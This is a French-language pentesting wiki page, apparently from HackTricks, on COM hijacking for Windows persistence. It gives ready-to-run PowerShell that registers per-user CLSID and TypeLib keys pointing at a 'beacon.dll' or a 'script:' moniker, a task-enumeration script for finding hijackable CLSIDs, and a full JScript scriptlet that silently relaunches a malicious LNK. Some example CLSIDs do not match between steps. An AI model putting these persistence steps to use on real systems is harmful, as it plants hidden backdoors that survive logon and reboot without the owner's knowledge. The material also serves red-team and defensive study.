# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Recherche de composants COM inexistants

Comme les valeurs de HKCU peuvent être modifiées par les utilisateurs, COM Hijacking peut être utilisé comme mécanisme de persistance. Avec `procmon`, il est facile de trouver des clés de registre COM recherchées qui n'existent pas et que un attaquant pourrait créer pour assurer la persistance. Filtres:

- **RegOpenKey** opérations.
- où le _Result_ est **NAME NOT FOUND**.
- et le _Path_ se termine par **InprocServer32**.

Une fois que vous avez décidé quel composant COM inexistant usurper, exécutez les commandes suivantes. _Faites attention si vous décidez d'usurper un COM qui est chargé toutes les quelques secondes, car cela pourrait être excessif._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Composants COM détournables du Task Scheduler

Les tâches Windows utilisent des déclencheurs personnalisés pour appeler des objets COM et, comme elles sont exécutées via le Task Scheduler, il est plus facile de prédire quand elles seront déclenchées.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

En examinant la sortie, vous pouvez en sélectionner une qui sera exécutée, par exemple, **à chaque connexion d'un utilisateur**.

En recherchant maintenant le CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** dans **HKEY\CLASSES\ROOT\CLSID** et dans HKLM et HKCU, vous constaterez généralement que la valeur n'existe pas dans HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Ensuite, vous pouvez simplement créer l'entrée HKCU et, à chaque connexion de l'utilisateur, votre backdoor sera exécutée.

---

## COM TypeLib Hijacking (script: moniker persistence)

Les Type Libraries (TypeLib) définissent les interfaces COM et sont chargées via `LoadTypeLib()`. Lorsqu'un serveur COM est instancié, l'OS peut aussi charger le TypeLib associé en consultant les clés de registre sous `HKCR\TypeLib\{LIBID}`. Si le TypeLib path est remplacé par un **moniker**, par ex. `script:C:\...\evil.sct`, Windows exécutera le scriptlet lorsque le TypeLib sera résolu — offrant une persistance discrète qui se déclenche lorsque des composants courants sont sollicités.

Cela a été observé contre le Microsoft Web Browser control (fréquemment chargé par Internet Explorer, des applications intégrant WebBrowser, et même `explorer.exe`).

### Étapes (PowerShell)

1) Identifiez le TypeLib (LIBID) utilisé par un CLSID à forte fréquence. Exemple de CLSID souvent abusé par des chaînes de malware : `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Pointez le chemin TypeLib par utilisateur vers un scriptlet local en utilisant le moniker `script:` (aucun droit administrateur requis) :
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Déposer un `.sct` JScript minimal qui relance votre payload principal (par ex. un `.lnk` utilisé par la chaîne initiale) :
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Déclenchement – ouvrir IE, une application qui intègre le WebBrowser control, ou même une activité courante d'Explorer chargera le TypeLib et exécutera le scriptlet, réarmant votre chaîne à l'ouverture de session/redémarrage.

Nettoyage
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Remarques
- Vous pouvez appliquer la même logique à d'autres composants COM fréquemment utilisés ; résolvez toujours d'abord le vrai `LIBID` depuis `HKCR\CLSID\{CLSID}\TypeLib`.
- Sur les systèmes 64-bit, vous pouvez également remplir la sous-clé `win64` pour les consommateurs 64-bit.

## Références

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
